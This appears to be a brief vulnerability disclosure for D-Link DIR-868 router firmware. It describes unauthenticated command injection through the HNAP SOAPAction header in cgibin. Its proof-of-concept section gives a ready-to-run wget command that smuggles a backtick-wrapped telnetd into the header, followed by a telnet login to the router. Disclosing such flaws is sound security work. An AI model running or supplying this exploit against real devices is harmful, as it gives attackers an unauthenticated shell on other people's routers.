# DIR-868

Exploit Author: yangchunyu@whu.edu.cn

Vendor: D-Link

Firmware: DIR868LA1_FW106KRb01.bin

I found unauthenticated remote code execution vulnerability in cgibin binary.

The HNAP service provided by cgibin does not filter the HTTP SOAPAction header field. The unauthenticated remote attacker can execute the shell command. 

![image](https://github.com/WhereisRain/DIR-868/blob/main/3.png)


# poc
wget --header='SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`telnetd`"' http://192.168.0.1/HNAP1

telnet 192.168.0.1
